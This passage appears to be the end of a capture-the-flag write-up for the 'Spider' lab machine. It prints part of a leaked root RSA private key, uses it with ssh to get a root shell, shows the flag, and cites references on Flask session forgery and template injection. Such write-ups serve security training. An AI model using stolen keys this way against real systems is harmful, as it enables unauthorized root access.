rKwBlmMiQnAyzzDKtNu9+Ca/kZ/cAjLpz3m1NW7X//rcDL8kBGs8RfuHqz/R4R7e
HtCvxuXOFnyo/I+A3j1dPHoc5UH56g1W82NwTCbtCfMfeUsUOByLcg3yEypClO/M
s7pWQ1e4m27/NmU7R/cslc03YFQxow+CIbdd59dBKTZKErdiMd49WiZSxizL7Rdt
WBTACsUCgYEAyU9azupb71YnGQVLpdTOzoTD6ReZlbDGeqz4BD5xzbkDj7MOT5Dy
R335NRBf7EJC0ODXNVSY+4vEXqMTx9eTxpMtsP6u0WvIYwy9C7K/wCz+WXNV0zc0
kcSQH/Yfkd2jADkMxHXkz9THXCChOfEt7IUmNSM2VBKb1xBMkuLXQbMCgYEAwUBS
FhRNrIB3os7qYayE+XrGVdx/KXcKva6zn20YktWYlH2HLfXcFQQdr30cPxxBSriS
BAKYcdFXSUQDPJ1/qE21OvDLmJFu4Xs7ZdGG8o5v8JmF6TLTwi0Vi45g38DJagEl
w42zV3vV7bsAhQsMvd3igLEoDFt34jO9nQv9KBcCgYEAk8eLVAY7AxFtljKK++ui
/Xv9DWnjtz2UFo5Pa14j0O+Wq7C4OrSfBth1Tvz8TcW+ovPLSD0YKODLgOWaKcQZ
mVaF3j64OsgyzHOXe7T2iq788NF4GZuXHcL8Qlo9hqj7dbhrpPUeyWrcBsd1U8G3
AsAj8jItOb6HZHN0owefGX0CgYAICQmgu2VjZ9ARp/Lc7tR0nyNCDLII4ldC/dGg
LmQYLuNyQSnuwktNYGdvlY8oHJ+mYLhJjGYUTXUIqdhMm+vj7p87fSmqBVoL7BjT
Kfwnd761zVxhDuj5KPC9ZcUnaJe3XabZU7oCSDbj9KOX5Ja6ClDRswwMP31jnW0j
64yyLwKBgBkRFxxuGkB9IMmcN19zMWA6akE0/jD6c/51IRx9lyeOmWFPqitNenWK
teYjUjFTLgoi8MSTPAVufpdQV4128HuMbMLVpHYOVWKH/noFetpTE2uFStsNrMD8
vEgG/fMJ9XmHVsPePviZBfrnszhP77sgCXX8Grhx9GlVMUdxeo+j
-----END RSA PRIVATE KEY-----
</h1>
```

Now we have root’s private SSH key. Let’s copy it, save it and login via SSH.

```other
🔥\> chmod 600 id_rsa

🔥\> ssh -i id_rsa root@spider.htb
Last login: Fri Jun  4 07:57:26 2021 from 10.10.14.106
root@spider:~# id
uid=0(root) gid=0(root) groups=0(root)

root@spider:~# cat root.txt
f796ea17af16e8fe6af9a44689915ba9
```

----

# References

[Defeating Flask’s Session Management](https://blog.paradoxis.nl/defeating-flasks-session-management-65706ba9d3ce)

[Server-Side Template Injection](https://portswigger.net/research/server-side-template-injection)
